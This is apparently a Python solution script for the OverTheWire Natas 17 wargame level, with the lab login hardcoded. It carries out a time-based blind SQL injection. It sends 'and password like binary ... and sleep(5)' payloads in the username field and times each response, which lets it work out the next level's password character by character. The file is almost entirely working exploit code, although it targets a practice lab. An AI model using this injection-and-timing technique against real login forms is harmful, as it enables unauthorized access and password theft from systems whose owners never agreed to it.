#!/bin/python3

import requests
import string
import time

site = "http://natas17.natas.labs.overthewire.org"
auth = ("natas17", "XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd")


def stepOne():
    #chars = ''.join([string.ascii_letters, string.digits])
    chars = list("")
    print(chars)
    dict = []
    for char in chars:
        data = {'username': 'natas18" and password like binary "%' + char + '%" and sleep(5) #'}
        stampIni = time.time()
        res = requests.post(site, auth=auth,  data=data)
        stampEnd = time.time()
        reqTime = stampEnd-stampIni
        print("Time: "+str(reqTime))
        if reqTime > 3:
            dict.append(char)
            print(dict)
        print(''.join(dict))

def stepTwo():
    dict = "agknoquvwxDEFGJLNPQUVZ468"
    password = list("")
    for i in range(1, 64):
        for char in dict:
            tmpPassArr = password[:]
            tmpPassArr.append(char)
            tmpPass = ''.join(tmpPassArr)
            
            data = {'username': 'natas18" and password like binary "' + tmpPass + '%" and sleep(5) #'}
            stampIni = time.time()
            res = requests.post(site, auth=auth,  data=data)
            stampEnd = time.time()
            reqTime = stampEnd-stampIni
            print("Requesting " + tmpPass + " in " + str(reqTime))
            if reqTime > 3:
                password.append(char)
                break
        print('PASS: ' + ''.join(password))

# Runnnig stepOne will produce: agknoquvwxDEFGJLNPQUVZ468
# stepOne()
stepTwo()